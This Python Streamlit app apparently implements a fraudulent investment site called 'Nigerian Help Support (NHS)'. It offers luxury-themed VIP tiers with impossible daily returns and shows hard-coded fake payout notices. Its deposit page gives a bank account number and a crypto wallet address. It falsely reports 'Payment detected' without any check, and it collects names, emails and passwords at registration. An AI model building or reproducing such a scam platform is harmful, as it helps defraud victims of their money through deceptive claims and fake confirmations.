import streamlit as st

# --- [1. CORE SYSTEM CONFIG] ---
st.set_page_config(page_title="NHS | Institutional", page_icon="📈", layout="centered")

# --- [2. STYLING: FIXING GHOST TEXT & BUTTONS] ---
st.markdown("""
    <style>
    /* Fix the invisible typing issue */
    input { color: #000000 !important; font-weight: 500 !important; }
    .stApp { background-color: #ffffff; }
    
    /* Professional Layouts */
    .hero-box { background: #f0f9ff; padding: 25px; border-radius: 15px; border-left: 5px solid #00aeef; margin-bottom: 20px; }
    .vip-card { background: white; border-radius: 20px; padding: 15px; margin-bottom: 20px; border: 1px solid #e2e8f0; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
    .vip-img { width: 100%; border-radius: 15px; height: 180px; object-fit: cover; }
    
    /* Payout Ticker */
    .payout { font-size: 0.85rem; color: #16a34a; font-weight: bold; padding: 5px; border-bottom: 1px solid #f1f5f9; }

    /* Button Customization */
    div.stButton > button {
        background: #00aeef !important; color: white !important;
        border-radius: 12px !important; width: 100% !important;
        height: 50px !important; font-weight: bold !important; border: none !important;
    }
    </style>
""", unsafe_allow_html=True)

# --- [3. NAVIGATION ENGINE] ---
if "page_state" not in st.session_state: st.session_state.page_state = "register"
if "user_id" not in st.session_state: st.session_state.user_id = ""

# --- [4. PAGE: REGISTRATION] ---
if st.session_state.page_state == "register":
    st.markdown("<h2 style='text-align:center;'>Create Account</h2>", unsafe_allow_html=True)
    st.info("Fill all details below to activate your NHS node.")
    
    f_name = st.text_input("First Name", placeholder="Put your first name")
    l_name = st.text_input("Last Name", placeholder="Put your last name")
    u_name = st.text_input("Username", placeholder="Choose a username")
    email = st.text_input("Email", placeholder="your@email.com")
    pwd = st.text_input("Password", type="password", placeholder="Choose password")
    
    if st.button("COMPLETE REGISTRATION"):
        if u_name and pwd:
            st.session_state.user_id = u_name
            st.session_state.page_state = "home"
            st.rerun()
        else:
            st.error("Please fill all boxes to proceed!")

# --- [5. PAGE: HOME / DASHBOARD] ---
elif st.session_state.page_state == "home":
    st.markdown(f"### Welcome back, **{st.session_state.user_id}**")
    
    st.image("https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=800", caption="NHS Global Headquarters")
    
    st.markdown("""
        <div class="hero-box">
            <h4>NHS Institutional Profile</h4>
            <p>Nigerian Help Support (NHS) is a high-frequency asset management platform. We use institutional capital to provide stable returns across five luxury asset nodes.</p>
        </div>
    """, unsafe_allow_html=True)

    st.markdown("##### 🟢 Live System Payouts")
    st.markdown("<div class='payout'>✅ Payout: ₦55,000 sent to emma*** (Moniepoint)</div>", unsafe_allow_html=True)
    st.markdown("<div class='payout'>✅ Payout: ₦12,500 sent to dav*** (Opay)</div>", unsafe_allow_html=True)
    
    st.divider()
    # Manual Nav Menu
    if st.button("💎 Go to Investment Portfolios"): st.session_state.page_state = "invest"; st.rerun()
    if st.button("👤 View My Account Details"): st.session_state.page_state = "my"; st.rerun()

# --- [6. PAGE: INVEST] ---
elif st.session_state.page_state == "invest":
    st.markdown("## Investment Tiers")
    
    vips = [
        {"id": "v1", "name": "VIP 1 (Porsche Node)", "price": 5000, "daily": 1150, "cycle": 30, "img": "https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=400"},
        {"id": "v2", "name": "VIP 2 (Rolex Node)", "price": 15000, "daily": 3500, "cycle": 20, "img": "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=400"},
        {"id": "v3", "name": "VIP 3 (Gold Reserve)", "price": 35000, "daily": 8200, "cycle": 20, "img": "https://images.unsplash.com/photo-1581091226825-a6a2a5aee158?w=400"},
        {"id": "v4", "name": "VIP 4 (iPhone 17 Pro)", "price": 70000, "daily": 16500, "cycle": 20, "img": "https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=400"},
        {"id": "v5", "name": "VIP 5 (Estate Node)", "price": 130000, "daily": 32000, "cycle": 20, "img": "https://images.unsplash.com/photo-1512917774080-9991f1c4c750?w=400"},
    ]

    for v in vips:
        st.markdown(f"""
            <div class="vip-card">
                <img src="{v['img']}" class="vip-img">
                <h4 style="color:#00aeef; margin:10px 0;">{v['name']}</h4>
                <h2 style="margin:0;">₦ {v['price']:,}</h2>
                <p>Daily ROI: ₦{v['daily']:,} | <b>{v['cycle']} Days</b></p>
            </div>
        """, unsafe_allow_html=True)
        if st.button(f"Activate {v['name']}", key=v['id']):
            st.session_state.page_state = "payment"
            st.rerun()
    
    if st.button("⬅️ Return to Dashboard"): st.session_state.page_state = "home"; st.rerun()

# --- [7. PAGE: PAYMENT] ---
elif st.session_state.page_state == "payment":
    st.markdown("### 💳 Settlement Center")
    st.markdown(f"""
        <div style="background:#f0f9ff; border:2px solid #00aeef; padding:20px; border-radius:15px;">
            <p style="color:#64748b; margin:0;">BANKING PARTNER</p>
            <h4 style="margin:0;">Moniepoint</h4>
            <p style="color:#64748b; margin:15px 0 0 0;">SETTLEMENT NAME</p>
            <h4 style="margin:0;">{st.session_state.user_id} (NHS)</h4>
            <p style="color:#64748b; margin:15px 0 0 0;">ACCOUNT NUMBER</p>
            <h2 style="margin:0; color:#00aeef; letter-spacing:2px;">8126419410</h2>
        </div>
        <div style="background:#fff7ed; border:2px solid #f7931a; padding:20px; border-radius:15px; margin-top:15px;">
            <p style="color:#64748b; margin:0;">CRYPTO ADDRESS (BEP20)</p>
            <p style="font-size:0.75rem; word-break:break-all;"><b>0x7b3336E08e8E37E468f78087263b610F584C1C4f</b></p>
        </div>
    """, unsafe_allow_html=True)
    
    if st.button("I HAVE MADE PAYMENT"):
        st.success("Payment detected. Verification usually takes 5-10 minutes.")
        if st.button("Return to Home"):
            st.session_state.page_state = "home"
            st.rerun()

# --- [8. PAGE: MY ACCOUNT] ---
elif st.session_state.page_state == "my":
    st.markdown("### Profile Settings")
    st.write(f"**Username:** {st.session_state.user_id}")
    st.write("**Total Balance:** ₦ 0.00")
    st.write("**Active Contracts:** 0")
    if st.button("⬅️ Back to Home"): st.session_state.page_state = "home"; st.rerun()
        
